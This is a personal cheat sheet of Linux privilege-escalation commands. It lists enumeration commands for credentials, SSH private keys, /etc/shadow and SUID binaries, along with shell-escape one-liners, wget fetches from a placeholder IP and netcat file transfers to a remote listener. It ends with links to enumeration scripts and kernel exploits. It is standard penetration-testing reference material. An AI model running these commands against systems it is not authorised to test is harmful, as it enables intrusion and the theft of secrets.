# Cheat Sheet for Privilege Escalation in Linux

It's no secret that [g0tm1lk's guide on this topic](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/) is - and should remain - a go-to reference. I'm creating this one mainly as a means of driving all of their notes into my memory! There's also a list of the most popular priv-esc enumeration scripts and where to find them at the bottom of the page. 

#### System information 

##### What distro are we working with?
`cat /etc/issue`

`cat /etc/*-release`

`cat /etc/lsb-release      # Debian based`

`cat /etc/redhat-release   # Redhat based`

##### What kernel version? 32-bit or 64-bit?
`cat /proc/version`

`uname -a`

`uname -mrs`

`rpm -q kernel`

`dmesg | grep Linux`

`ls /boot | grep vmlinuz-`

##### What can be learned from environment variables?
`cat /etc/profile`

`cat /etc/bashrc`

`cat ~/.bash_profile`

`cat ~/.bashrc`

`cat ~/.bash_logout`

`env`

`set`

#### User info
`id`

`who`

`w`

`last`

`cat /etc/passwd | cut -d: -f1    `

`grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}'  ` 

`awk -F: '($3 == "0") {print}' /etc/passwd `

`cat /etc/sudoers`

`sudo -l`

##### Any juicy info in user history files?
`cat ~/.bash_history`

`cat ~/.nano_history`

`cat ~/.atftp_history`

`cat ~/.mysql_history`

`cat ~/.php_history`

#### Applications & services

##### Which services are running? Who's running it?
`ps aux`

`ps -ef`

`top`

`cat /etc/services`

`ps aux | grep root`

`ps -ef | grep root`

##### What applications are installed?
`ls -alh /usr/bin/`

`ls -alh /sbin/`

`dpkg -l`

`rpm -qa`

`ls -alh /var/cache/apt/archivesO`

`ls -alh /var/cache/yum/`

##### Are any service settings misconfigured? 
`cat /etc/syslog.conf`

`cat /etc/chttp.conf`

`cat /etc/lighttpd.conf`

`cat /etc/cups/cupsd.conf`

`cat /etc/inetd.conf`

`cat /etc/apache2/apache2.conf`

`cat /etc/my.conf`

`cat /etc/httpd/conf/httpd.conf`

`cat /opt/lampp/etc/httpd.conf`

`ls -aRl /etc/ | awk '$1 ~ /^.*r.*/`

##### What jobs are scheduled?
`crontab -l`

`ls -alh /var/spool/cron`

`ls -al /etc/ | grep cron`

`ls -al /etc/cron*`

`cat /etc/cron*`

`cat /etc/at.allow`

`cat /etc/at.deny`

`cat /etc/cron.allow`

`cat /etc/cron.deny`

`cat /etc/crontab`

`cat /etc/anacrontab`

`cat /var/spool/cron/crontabs/root`

##### Any plain-text usernames or passwords in specific files?
`grep -i user [filename]`

`grep -i pass [filename]`

`grep -C 5 "password" [filename]`



#### Communication & networking

##### What NICs? Is the system connected to another network?
`/sbin/ifconfig -a`

`cat /etc/network/interfaces`

`cat /etc/sysconfig/network`

##### What are the network config settings?
`cat /etc/resolv.conf`

`cat /etc/sysconfig/network`

`cat /etc/networks`

`iptables -L`

`hostname`

`dnsdomainname`

##### What other users & hosts are communicating with the system?
`lsof -i`

`lsof -i :80`

`grep 80 /etc/services`

`netstat -antup`

`netstat -antpx`

`netstat -tulpn`

`chkconfig --list`

`chkconfig --list | grep 3:on`

`last`

`w`

##### Anything interesting cached?
`arp -e`

`route`

`/sbin/route -nee`

#### Sensitive files

##### What sensitive files can be viewed?
`cat /etc/passwd`

`cat /etc/group`

`cat /etc/shadow`

`ls -alh /var/mail/`

`cat /var/apache2/config.inc`

`cat /var/lib/mysql/mysql/user.MYD`

`cat /root/anaconda-ks.cfg`

##### Anything interesting in home/root directories?
`ls -ahlR /root/`

`ls -ahlR /home/`

##### Can any sensitive SSH keys be viewed?
`cat ~/.ssh/authorized_keys`

`cat ~/.ssh/identity.pub`

`cat ~/.ssh/identity`

`cat ~/.ssh/id_rsa.pub`

`cat ~/.ssh/id_rsa`

`cat ~/.ssh/id_dsa.pub`

`cat ~/.ssh/id_dsa`

`cat /etc/ssh/ssh_config`

`cat /etc/ssh/sshd_config`

`cat /etc/ssh/ssh_host_dsa_key.pub`

`cat /etc/ssh/ssh_host_dsa_key`

`cat /etc/ssh/ssh_host_rsa_key.pub`

`cat /etc/ssh/ssh_host_rsa_key`

`cat /etc/ssh/ssh_host_key.pub`

`cat /etc/ssh/ssh_host_key`


#### File system

##### What config files can be written in /etc/? 
`ls -aRl /etc/ | awk '$1 ~ /^.*w.*/' 2>/dev/null     # Anyone`

`ls -aRl /etc/ | awk '$1 ~ /^..w/' 2>/dev/null       # Owner`

`ls -aRl /etc/ | awk '$1 ~ /^.....w/' 2>/dev/null    # Group`

`ls -aRl /etc/ | awk '$1 ~ /w.$/' 2>/dev/null        # Other`

`find /etc/ -readable -type f 2>/dev/null               # Anyone`

`find /etc/ -readable -type f -maxdepth 1 2>/dev/null   # Anyone`

##### What can be found in /var/?
`ls -alh /var/log`

`ls -alh /var/mail`

`ls -alh /var/spool`

`ls -alh /var/spool/lpd`

`ls -alh /var/lib/pgsql`

`ls -alh /var/lib/mysql`

`cat /var/lib/dhcp3/dhclient.leases`

##### Any notable files on web servers?
`ls -alhR /var/www/`

`ls -alhR /srv/www/htdocs/`

`ls -alhR /usr/local/www/apache22/data/`

`ls -alhR /opt/lampp/htdocs/`

`ls -alhR /var/www/html/`

##### Check relevant log files
`cat /etc/httpd/logs/access_log`

`cat /etc/httpd/logs/access.log`

`cat /etc/httpd/logs/error_log`

`cat /etc/httpd/logs/error.log`

`cat /var/log/apache2/access_log`

`cat /var/log/apache2/access.log`

`cat /var/log/apache2/error_log`

`cat /var/log/apache2/error.log`

`cat /var/log/apache/access_log`

`cat /var/log/apache/access.log`

`cat /var/log/auth.log`

`cat /var/log/chttp.log`

`cat /var/log/cups/error_log`

`cat /var/log/dpkg.log`

`cat /var/log/faillog`

`cat /var/log/httpd/access_log`

`cat /var/log/httpd/access.log`

`cat /var/log/httpd/error_log`

`cat /var/log/httpd/error.log`

`cat /var/log/lastlog`

`cat /var/log/lighttpd/access.log`

`cat /var/log/lighttpd/error.log`

`cat /var/log/lighttpd/lighttpd.access.log`

`cat /var/log/lighttpd/lighttpd.error.log`

`cat /var/log/messages`

`cat /var/log/secure`

`cat /var/log/syslog`

`cat /var/log/wtmp`

`cat /var/log/xferlog`

`cat /var/log/yum.log`

`cat /var/run/utmp`

`cat /var/webmin/miniserv.log`

`cat /var/www/logs/access_log`

`cat /var/www/logs/access.log`

`ls -alh /var/lib/dhcp3/`

`ls -alh /var/log/postgresql/`

`ls -alh /var/log/proftpd/`

`ls -alh /var/log/samba/`

##### Break out of jail shell
`python -c 'import pty;pty.spawn("/bin/bash")'`

`echo os.system('/bin/bash')`

`/bin/sh -i`

##### Check mounted/unmounted file systems
`mount`

`df -h`
	
`cat /etc/fstab`

##### Sticky bits, SGID && SUID
`find / -perm -1000 -type d 2>/dev/null   # Sticky bit - Only the owner of the directory or the owner of a file can delete or rename here.`

`find / -perm -g=s -type f 2>/dev/null    # SGID (chmod 2000) - run as the group, not the user who started it.`

`find / -perm -u=s -type f 2>/dev/null    # SUID (chmod 4000) - run as the owner, not the user who started it.`


`find / -perm -g=s -o -perm -u=s -type f 2>/dev/null    # SGID or SUID`

`for i in 'locate -r "bin$"'; do find $i \( -perm -4000 -o -perm -2000 \) -type f 2>/dev/null; done    # Looks in 'common' places: /bin, /sbin, /usr/bin, /usr/sbin, /usr/local/bin, /usr/local/sbin and any other *bin, for SGID or SUID (Quicker search)`

`# find starting at root (/), SGID or SUID, not Symbolic links, only 3 folders deep, list with more detail and hide any errors (e.g. permission denied)`

`find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null`

##### World-writable and executable locations
`find / -writable -type d 2>/dev/null      # world-writeable folders`

`find / -perm -222 -type d 2>/dev/null     # world-writeable folders`

`find / -perm -o w -type d 2>/dev/null     # world-writeable folders`

`find / -perm -o x -type d 2>/dev/null     # world-executable folders`

`find / \( -perm -o w -perm -o x \) -type d 2>/dev/null   # world-writeable & executable folders`

`find / -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print   # world-writeable files`

`find /dir -xdev \( -nouser -o -nogroup \) -print   # Noowner files`

#### Transfering files

##### Check for useful bins
`locate /bin/wget`

`locate /bin/nc`

`locate /bin/netcat`

`locate /bin/tftp`

`locate /bin/ftp`

##### Using wget:
`wget http://<IP><PORT>/FILE`

##### Using curl
`curl http://example.com/some.file --output some.file`

##### Using Netcat:
###### Set up listener on receiver:`

`nc -nlvp <PORT> > outputname.txt`

###### Post file from sender:`

`nc -nv <IP> <PORT> < inputfile.txt`


#### Linux enumeration scripts
LinEnum.sh --- https://github.com/rebootuser/LinEnum

linux-local-enum.sh --- https://highon.coffee/downloads/linux-local-enum.sh

linuxprivchecker.py --- https://github.com/sleventyeleven/linuxprivchecker/blob/master/linuxprivchecker.py

unix-privesc-check --- https://github.com/pentestmonkey/unix-privesc-check

linux-exploit-suggester --- https://github.com/mzet-/linux-exploit-suggester

#### Collection of Linux kernel exploits
https://github.com/SecWiki/linux-kernel-exploits







